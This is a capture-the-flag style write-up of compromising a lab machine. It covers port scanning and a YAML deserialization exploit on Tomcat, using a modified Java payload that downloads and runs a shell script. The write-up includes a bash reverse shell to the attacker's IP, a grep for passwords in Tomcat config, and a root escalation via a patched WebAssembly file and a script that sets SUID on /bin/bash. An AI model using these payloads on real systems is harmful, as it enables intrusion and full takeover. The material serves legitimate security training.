# Enumeration.

To solve this machine we start with some enumeration ports (open services).

``` bash
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: allPorts
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.91 scan initiated Tue Jul  6 13:30:52 2021 as: nmap -p- -sS --min-rate 5000 --open -vvvv -n -Pn -oN allPortss 10.10.10.227
   2   │ Nmap scan report for 10.10.10.227
   3   │ Host is up, received user-set (0.38s latency).
   4   │ Scanned at 2021-07-06 13:30:52 -05 for 182s
   5   │ Not shown: 52455 filtered ports, 13078 closed ports
   6   │ Reason: 52455 no-responses and 13078 resets
   7   │ Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
   8   │ PORT     STATE SERVICE    REASON
   9   │ 22/tcp   open  ssh        syn-ack ttl 63
  10   │ 8080/tcp open  http-proxy syn-ack ttl 63
  11   │ 
  12   │ Read data files from: /usr/bin/../share/nmap
  13   │ # Nmap done at Tue Jul  6 13:33:54 2021 -- 1 IP address (1 host up) scanned in 182.04 seconds
───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

This first scan will recognize the open ports. Then we can do the enumeration open services. So lets do it.

``` bash
# Nmap 7.91 scan initiated Tue Jul  6 14:48:13 2021 as: nmap -sC -sV -p22,8080 -oN targeted 10.10.10.227
Nmap scan report for 10.10.10.227
Host is up (0.099s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 6d:fc:68:e2:da:5e:80:df:bc:d0:45:f5:29:db:04:ee (RSA)
|   256 7a:c9:83:7e:13:cb:c3:f9:59:1e:53:21:ab:19:76:ab (ECDSA)
|_  256 17:6b:c3:a8:fc:5d:36:08:a1:40:89:d2:f4:0a:c6:46 (ED25519)
8080/tcp open  http    Apache Tomcat 9.0.38
|_http-title: Parse YAML
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jul  6 14:48:32 2021 -- 1 IP address (1 host up) scanned in 19.32 seconds
```

Before we keep going to the web server. lets do more service enumerations. Lets do some `whatweb` enumeration.

``` bash 
whatweb 10.10.10.227:8080                  
http://10.10.10.227:8080 [200 OK] Cookies[JSESSIONID], Country[RESERVED][ZZ], HttpOnly[JSESSIONID], IP[10.10.10.227], Java, Title[Parse YAML]
```


So now we can go to web server and check what it has. 

![[Pasted image 20210706164527.png]]

Looks like something we can write on, so the first thing coming to my head is RCE(Remote Code Execution). And also, it give us the name of it, and `whatweb` did it too: `YAML`, and its a java.

Searching `YAML explotation` on internet i find an repository from github that looks really interesting. 

![[Pasted image 20210706165356.png]]

It gives a RCE we can try.

I put the code in it and replace it ip with mine, and open a server with python.

![[Pasted image 20210706165706.png]]

And it works, it tries to communicate with my machine to get the file `yaml-payload.jar` but i dont have it. So lets keep reading the github repository and understand what it does.

And after read it, i find out that there is a `.java`.

![[Pasted image 20210706170441.png]]

It put a `run time execution`. Thinking a little bit, we can change those commands that the script have for default, to get some code execution from the machine and then get a reverse shell. Lets explain this a step by step.


First, clone the repository and open the  `.java`. Then change the `java
Runtime.getRuntime().exec(`.

Before.
``` java
public AwesomeScriptEngineFactory() {
try {
Runtime.getRuntime().exec("dig scriptengine.x.artsploit.com");
Runtime.getRuntime().exec("/Applications/Calculator.app/Contents/MacOS/Calculator");
} catch (IOException e) {
e.printStackTrace();
}
}
```

After.
``` java
public AwesomeScriptEngineFactory() {
try {
Runtime.getRuntime().exec("curl http://10.10.16.44:8000/shell.sh -o /tmp/shell.sh");
Runtime.getRuntime().exec("bash /tmp/shell.sh");
} catch (IOException e) {
e.printStackTrace();
}
}
```

What i im doing here? im telling him to execute a command so the remote machine will get a file from my machine, the file is a reverse shell made in bash named `shell.sh` that after get it, it will send it to `tmp` where i think, it will have access to execute the file. So the other command is making the remote machine to execute the file `shell.sh`.

``` bash
──────────────────────────────────────────────────────
       │ File: shell.sh
───────┴───────────────────────────────────────────────
   1   │ #!/bin/bash 
   2   │ 
   3   │ bash -i >& /dev/tcp/10.10.16.44/4444 0>&1
───────┴───────────────────────────────────────────────
```

So now we can do the others commands that the repository says, to create the `.jar` that is the file we are sending by the python server. 

``` bash
javac src/artsploit/AwesomeScriptEngineFactory.java
jar -cvf yaml-payload.jar -C src/ .
```

Now lets open the python server and go back to the web and send the RCE.

What would happen is, when you send the RCE it will run the code and make a connection to local machine, where the `.jar` is and get it, after that it will run and get the `shell.sh` and give us a reverse shell.

![[Pasted image 20210707091556.png]]
![[Pasted image 20210707091636.png]]
![[Pasted image 20210707091652.png]]


# Lateral Movement.

So now we must try to get access with a user with privileges, lets check directories, and there is one interesting at `/opt/tomcat/conf`, actually there are more than one, so for not start looking one by one we can do `cat * | grep password` and get the search easier.

![[Pasted image 20210707094821.png]]

And there it is, some credentials for a user named `admin`.
 Lets use them to get access from `ssh`.
 
 ![[Pasted image 20210707095058.png]]
 
 There you go! we are now the user admin (still not root).
 
 # Privilenge Scalation.
 
 Lets get that root!
 
Now we can try to see if `admin` as some privilege to execute something with root privilege, and look like he can.

![[Pasted image 20210707101039.png]]

Looks like I can exectue a `.go` file lets check what it does.

![[Pasted image 20210707101813.png]]

Checking the code we can see that it exectue an other file named `main.wasm`. But what in the hell is a `.wasm` file.

![[Pasted image 20210707102111.png]]

Is a Webassembly binary code. What that means?

It mean we need to change that `main.wasm` file to get acces to the part in the `.go` script to get in the if condition that execute an other script named `deploy.sh`. 

![[Pasted image 20210707105057.png]]

But how do we do that?

First, lets give us the `main.wasm` to our local machine so we can manipulate it.

![[Pasted image 20210707105708.png]]
![[Pasted image 20210707105720.png]]

Now after knowing it is a webassembly, there is a way to convert that bynary to a readable file, you can convert from `.wasm` to `.wat`.

Lets find a tool to do that, there are a lot of them on internet, choose the one you want.

![[Pasted image 20210707105908.png]]

Im gonna use this one. Lets upload our file.

![[Pasted image 20210707111619.png]]

There are a lot of crazy info, but not hard, or if you just put some logic you see there is a constant variable `i32.const 0)` and the `.go` its get in the condition cause 0 its different to 1, so lets change that constant f variable to an 1.

After that just copy the script and go to a wat2wasm tool to create the new `.wasm` file.

![[Pasted image 20210707112607.png]]

Download and send it back to the ophiuchi machine.

But, you must create a temporary directory where you gonna put the new `main.wasm`and the new `deploy.sh` this second one will be a script to give us privilege.

![[Pasted image 20210707113521.png]]

``` bash
#!/bin/bash
chmod u+s /bin/bash
```

Then lets execute the command that we can made with root privilege.

![[Pasted image 20210707113619.png]]